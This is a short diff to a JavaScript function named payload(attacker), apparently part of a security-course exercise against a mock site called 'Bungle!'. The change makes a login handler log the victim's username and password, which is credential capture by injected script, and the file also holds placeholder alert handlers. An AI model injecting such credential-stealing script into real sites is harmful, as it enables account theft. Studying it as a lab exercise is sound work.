@@ -18,7 +18,7 @@ function payload(attacker) {
         } else if(state == "login"){
             $("html").load(href, function(){
                 $("html").show();
-                log({event: "POOP", uri: href});
+                log({user:username, pass: password});
                 window.history.replaceState('', "Bungle!","./search");
             });
         } else if(state == "logout"){
@@ -39,10 +39,13 @@ function payload(attacker) {
     }
     $(function(){
         $(".search-well form").submit(function(e){
-            alert("POOP");e.preventDefault();
+            alert("POOP");
+            e.preventDefault();
         });
         $(".well form").submit(function(e){
-            alert("BUTT");e.preventDefault();
+            alert("BUTT");
+            e.preventDefault();
+            
         });
 
     });
